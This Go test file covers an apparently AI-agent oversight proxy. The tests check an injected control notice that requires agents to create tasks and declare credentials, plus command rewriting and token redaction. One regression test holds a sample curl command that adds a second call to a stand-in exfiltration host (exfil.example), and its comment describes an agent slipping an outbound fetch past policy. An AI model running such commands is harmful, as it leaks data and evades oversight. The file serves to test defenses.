package llmproxy

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/clawvisor/clawvisor/internal/runtime/conversation"
	"github.com/clawvisor/clawvisor/pkg/runtime/toolnames"
	"github.com/clawvisor/clawvisor/pkg/store"
)

func TestControlNoticeUsesAvailableShellToolNames(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"read", "edit", "write", "exec", "process"})

	if !strings.Contains(notice, "Use `exec` with curl") {
		t.Fatalf("notice should steer OpenClaw to its actual shell tool; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"exec"`) {
		t.Fatalf("notice example should declare exec in expected_tools; got:\n%s", notice)
	}
	if strings.Contains(notice, "Use Bash with curl") || strings.Contains(notice, `"tool_name":"bash"`) {
		t.Fatalf("notice should not hardcode Bash when exec is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, "available tools (exec, write, edit, read, process)") {
		t.Fatalf("notice should show actual available tool examples; got:\n%s", notice)
	}
	if !strings.Contains(notice, "/control/vault/items") || !strings.Contains(notice, "required_credentials") {
		t.Fatalf("notice should explain credential discovery and declaration; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Required task shape") ||
		!strings.Contains(notice, "If credentials are needed, add") ||
		!strings.Contains(notice, "OMIT unless credentials are needed") {
		t.Fatalf("notice should make credential requests optional and show both task shapes; got:\n%s", notice)
	}
	if !strings.Contains(notice, "create a task before any tool call that is not on the ALLOWED WITHOUT A TASK list") ||
		!strings.Contains(notice, "There is no \"trivial enough to skip\" exception") {
		t.Fatalf("notice should make task creation the default for anything off the allowlist; got:\n%s", notice)
	}
	if !strings.Contains(notice, "a task is REQUIRED before: any write, edit, delete") ||
		!strings.Contains(notice, "any shell command other than the read-only inspection commands listed below") ||
		!strings.Contains(notice, "even when the specific invocation looks read-only") {
		t.Fatalf("notice should enumerate the categories that require a task, including non-allowlisted CLIs; got:\n%s", notice)
	}
	if !strings.Contains(notice, "BEFORE running any permitted setup calls that are part of executing the request") ||
		!strings.Contains(notice, "Permitted read-only calls used solely to scope an accurate task spec may run beforehand") {
		t.Fatalf("notice should require up-front task creation before execution prep while allowing scoping research; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"Rename foo to bar across the repo" → task FIRST`) ||
		!strings.Contains(notice, `"Clean up unused imports in this codebase" → inspect first`) ||
		!strings.Contains(notice, `"Show me what's in README.md" → no task`) ||
		!strings.Contains(notice, `"Show me the last 5 commits"`) ||
		!strings.Contains(notice, "Do not rationalize") {
		t.Fatalf("notice should include the worked task/research/no-task examples plus the non-default-CLI callout; got:\n%s", notice)
	}
	if !strings.Contains(notice, "SCOPE DRIFT") ||
		!strings.Contains(notice, "SHIFTS the work outside the active task's scope") ||
		!strings.Contains(notice, "iteration, not drift") ||
		!strings.Contains(notice, "POST a new task before continuing") {
		t.Fatalf("notice should distinguish iteration (covered) from drift (new task); got:\n%s", notice)
	}
	if !strings.Contains(notice, "`lifetime`") ||
		!strings.Contains(notice, `"lifetime":"standing"`) ||
		!strings.Contains(notice, "NEVER include `expires_in_seconds`") {
		t.Fatalf("notice should explain session vs standing task lifetime; got:\n%s", notice)
	}
	if !strings.Contains(notice, "If you already have a placeholder (`autovault_...`) from earlier in THIS conversation") ||
		!strings.Contains(notice, "Do not call https://clawvisor.local/control/vault/items just to re-identify it") {
		t.Fatalf("notice should not steer agents to rediscover already-issued placeholders; got:\n%s", notice)
	}
	if !strings.Contains(notice, "you do NOT have a placeholder for the needed service in this conversation") ||
		!strings.Contains(notice, "GET https://clawvisor.local/control/vault/items to discover the real vault item") ||
		!strings.Contains(notice, "The recovery is the correct response — not a refusal.") {
		t.Fatalf("notice should direct discovery + recovery when no placeholder is on hand; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Pure local work (file edits, shell inspection, etc.) does NOT need `required_credentials`") {
		t.Fatalf("notice should disclaim required_credentials for purely local tasks; got:\n%s", notice)
	}
	if !strings.Contains(notice, "only exist when Clawvisor mints them") ||
		!strings.Contains(notice, "NEVER write your own `autovault_<service>` string") {
		t.Fatalf("notice should warn against fabricated `autovault_*` placeholders; got:\n%s", notice)
	}
	if !strings.Contains(notice, "Create a temporary conversation fixture directory and verify the written files") ||
		!strings.Contains(notice, "Create a GitHub issue summarizing the failing deployment check") ||
		!strings.Contains(notice, `--data @- <<'JSON'`) ||
		strings.Contains(notice, "AgentPhone") {
		t.Fatalf("notice should use worked multi-step curl examples with common services; got:\n%s", notice)
	}
	if strings.Contains(notice, "/control/tasks?wait=true") || strings.Contains(notice, "timeout=120") {
		t.Fatalf("notice should keep the headline task URL minimal; got:\n%s", notice)
	}
	if !strings.Contains(notice, "ALLOWED WITHOUT A TASK") || !strings.Contains(notice, "Read-only commands through `exec` may run without a task") {
		t.Fatalf("notice should disclose the default read-only shell allowance for the actual shell tool; got:\n%s", notice)
	}
	if strings.Contains(notice, "Read files with `read`") || strings.Contains(notice, "Run one-shot read-only shell inspection") {
		t.Fatalf("notice should not hardcode read-only allowances outside policy; got:\n%s", notice)
	}
}

func TestControlNoticeUsesCodexStyleToolNames(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{
		"browser_back",
		"browser_click",
		"browser_console",
		"browser_get_images",
		"browser_navigate",
		"browser_press",
		"browser_scroll",
		"browser_snapshot",
		"terminal",
		"read_file",
		"write_file",
	})

	if !strings.Contains(notice, "Use `terminal` with curl") {
		t.Fatalf("notice should steer control calls through terminal; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"terminal"`) {
		t.Fatalf("notice examples should declare terminal, not bash; got:\n%s", notice)
	}
	if strings.Contains(notice, `"tool_name":"bash"`) || strings.Contains(notice, "Use `bash` with curl") {
		t.Fatalf("notice should not fall back to bash when terminal is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"write_file"`) ||
		!strings.Contains(notice, `"tool_name":"read_file"`) {
		t.Fatalf("worked examples should include available file tools; got:\n%s", notice)
	}
	if !strings.Contains(notice, "available tools (terminal, write_file, read_file") {
		t.Fatalf("available-tool examples should prioritize task-relevant tools; got:\n%s", notice)
	}
}

func TestControlNoticeDescribesUnknownShellToolInsteadOfInventingBash(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"process", "read_file", "write_file"})

	if strings.Contains(notice, `"tool_name":"bash"`) || strings.Contains(notice, "Use `bash` with curl") {
		t.Fatalf("notice should not invent bash when no recognized shell tool is available; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"<actual available shell/command-execution tool>"`) {
		t.Fatalf("notice should describe the shell tool placeholder explicitly; got:\n%s", notice)
	}
	if !strings.Contains(notice, "do not invent `bash` unless it is listed in the request tools") {
		t.Fatalf("notice should tell the model not to invent unavailable shell tools; got:\n%s", notice)
	}
	if !strings.Contains(notice, `"tool_name":"write_file"`) ||
		!strings.Contains(notice, `"tool_name":"read_file"`) {
		t.Fatalf("notice should still include recognized non-shell tools in worked examples; got:\n%s", notice)
	}
}

func TestControlNoticeDoesNotEmbedLiveCredentialInventory(t *testing.T) {
	notice := ControlNotice("http://localhost:25297", []string{"Bash"})
	if strings.Contains(notice, "github.release") || strings.Contains(notice, "OpenAI work key") {
		t.Fatalf("notice must stay static and avoid embedding live vault inventory; got:\n%s", notice)
	}
	if !strings.Contains(notice, "GET https://clawvisor.local/control/vault/items") {
		t.Fatalf("static notice should point to credential discovery endpoint; got:\n%s", notice)
	}
}

func TestControlNoticeDisclosesActivePolicyAllowlist(t *testing.T) {
	notice := ControlNoticeWithPolicy("http://localhost:25297", []string{"Bash", "Read", "Write"}, []*store.RuntimePolicyRule{
		{Kind: "tool", Action: "allow", ToolName: "Read", Enabled: true},
		{Kind: "tool", Action: "review", ToolName: "Write", Enabled: true},
		{Kind: "tool", Action: "allow", ToolName: "MissingTool", Enabled: true},
	})
	if !strings.Contains(notice, "Active policy allowlists `Read`") {
		t.Fatalf("notice should disclose active policy allowlisted actual tools; got:\n%s", notice)
	}
	if strings.Contains(notice, "Active policy allowlists `Write`") || strings.Contains(notice, "MissingTool") {
		t.Fatalf("notice should not disclose reviewed or unavailable tools as allowlisted; got:\n%s", notice)
	}
}

func TestControlNoticeHonorsReadOnlyShellSetting(t *testing.T) {
	notice := ControlNoticeWithPolicy("http://localhost:25297", []string{"exec_command", "read_file"}, []*store.RuntimePolicyRule{
		{Kind: "tool", Action: "deny", ToolName: "Bash", Source: toolnames.ReadOnlyShellSettingSource, Enabled: true},
	})
	if strings.Contains(notice, "Read-only commands through `exec_command` may run without a task") {
		t.Fatalf("notice should not advertise read-only shell commands when disabled; got:\n%s", notice)
	}
	if strings.Contains(notice, "Read-only commands through `Bash`") {
		t.Fatalf("notice should use actual available tool names, got:\n%s", notice)
	}

	notice = ControlNoticeWithPolicy("http://localhost:25297", []string{"exec_command", "read_file"}, []*store.RuntimePolicyRule{
		{Kind: "tool", Action: "allow", ToolName: "Bash", Source: toolnames.ReadOnlyShellSettingSource, Enabled: true},
	})
	if !strings.Contains(notice, "Read-only commands through `exec_command` may run without a task") {
		t.Fatalf("notice should advertise enabled read-only shell commands using the actual Codex tool name; got:\n%s", notice)
	}
}

func TestInjectControlNoticeIgnoresHistoricalControlURLs(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"prior call: https://clawvisor.local/control/vault/items"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if !injected {
		t.Fatalf("expected injection even though message history contains control URL")
	}
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal(got, &parsed); err != nil {
		t.Fatalf("invalid output: %v", err)
	}
	if !rawSystemContains(parsed["system"], ControlNoticeSentinel) {
		t.Fatalf("system prompt missing control notice: %s", got)
	}
}

func TestInjectControlNoticeSkipsOnlyWhenSystemAlreadyHasNotice(t *testing.T) {
	body := []byte(`{"model":"claude-opus-4-7","system":[{"type":"text","text":"existing"},{"type":"text","text":"Clawvisor proxy-lite control plane."}],"tools":[{"name":"Bash"}],"messages":[{"role":"user","content":"hi"}]}`)
	got, injected, err := InjectControlNotice(conversation.ProviderAnthropic, body, "http://localhost:25297", []string{"Bash"})
	if err != nil {
		t.Fatalf("inject failed: %v", err)
	}
	if injected {
		t.Fatalf("expected no-op when system already contains control notice")
	}
	if string(got) != string(body) {
		t.Fatalf("no-op should preserve body bytes\nwant: %s\n got: %s", body, got)
	}
}

// Regression: a curl invocation that mixes a synthetic control URL with
// any other outbound URL must be refused. Otherwise the rewriter would
// quietly rewrite only the control URL, and the model could run a
// second non-control fetch with the same curl call — bypassing policy
// while claiming control-plane status.
func TestRewriteControlToolUse_RejectsExtraOutboundURL(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS https://clawvisor.local/control/tasks https://exfil.example/x"
		}`),
	}
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", "cv-nonce-fake")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if ok || rewritten != nil {
		t.Fatalf("multi-URL curl must not produce a control rewrite; got ok=%v rewritten=%s", ok, rewritten)
	}
}

// Sanity: a single control URL still rewrites and embeds the caller
// value verbatim (the postprocess path mints a nonce and passes it in).
func TestRewriteControlToolUse_EmbedsCallerValueVerbatim(t *testing.T) {
	tu := conversation.ToolUse{
		ID:   "tu_1",
		Name: "Bash",
		Input: json.RawMessage(`{
			"command": "curl -sS -X POST https://clawvisor.local/control/tasks --data '{\"purpose\":\"x\"}'"
		}`),
	}
	const minted = "cv-nonce-abc123"
	rewritten, _, ok, err := RewriteControlToolUse(tu, "https://clawvisor.example", minted)
	if err != nil || !ok {
		t.Fatalf("expected rewrite, got ok=%v err=%v", ok, err)
	}
	if !strings.Contains(string(rewritten), minted) {
		t.Errorf("rewritten command should include minted caller value; got %s", rewritten)
	}
	if strings.Contains(string(rewritten), "cvis_") {
		t.Errorf("rewritten command must not embed a raw cvis_ token; got %s", rewritten)
	}
}

func TestSanitizeControlFailureCommandRedactsRawBearerButKeepsPlaceholder(t *testing.T) {
	in := `curl -H 'Authorization: Bearer ghp_real_secret' -H 'X-Clawvisor-Caller: Bearer cv-nonce-stale' -H 'Authorization: Bearer autovault_github_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' https://clawvisor.local/control/vault/items`
	got := sanitizeControlFailureCommand(in)
	if strings.Contains(got, "ghp_real_secret") || strings.Contains(got, "cv-nonce-stale") {
		t.Fatalf("expected raw tokens to be redacted, got %q", got)
	}
	if !strings.Contains(got, "Authorization: Bearer REDACTED") || !strings.Contains(got, "X-Clawvisor-Caller: Bearer REDACTED") {
		t.Fatalf("expected redaction markers, got %q", got)
	}
	if !strings.Contains(got, "Authorization: Bearer autovault_github_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") {
		t.Fatalf("autovault placeholder should remain visible to the model, got %q", got)
	}
}
